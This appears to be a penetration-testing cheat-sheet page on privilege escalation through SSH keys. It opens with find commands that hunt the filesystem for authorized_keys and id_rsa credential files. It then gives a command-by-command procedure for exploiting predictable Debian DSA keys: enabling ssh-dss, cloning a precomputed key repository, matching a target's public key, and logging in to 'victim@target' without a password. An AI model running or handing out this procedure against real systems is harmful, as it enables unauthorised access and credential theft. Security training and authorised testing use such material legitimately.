# Escalation via SSH Keys

#### Sensitive files

```text
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
...
```

#### 

#### SSH Key Predictable PRNG \(Authorized\_Keys\) Process

This module describes how to attempt to use an obtained authorized\_keys file on a host system.

Needed : SSH-DSS String from authorized\_keys file

**Steps**

1. Get the authorized\_keys file. An example of this file would look like so:

```text
ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
```

1. Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:

```text
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshd_config
/etc/init.d/ssh restart
```

1. Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:

```text
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
```

1. Grab the first 20 or 30 bytes from the key file shown above starting with the `"AAAA..."` portion and grep the unpacked keys with it as:

```text
grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
```

1. IF SUCCESSFUL, this will return a file \(68b329da9893e34099c7d8ad5cb9c940-17934.pub\) public file. To use the private key file to connect, drop the '.pub' extension and do:

```text
ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
```

And you should connect without requiring a password. If stuck, the `-vvv` verbosity should provide enough details as to why.

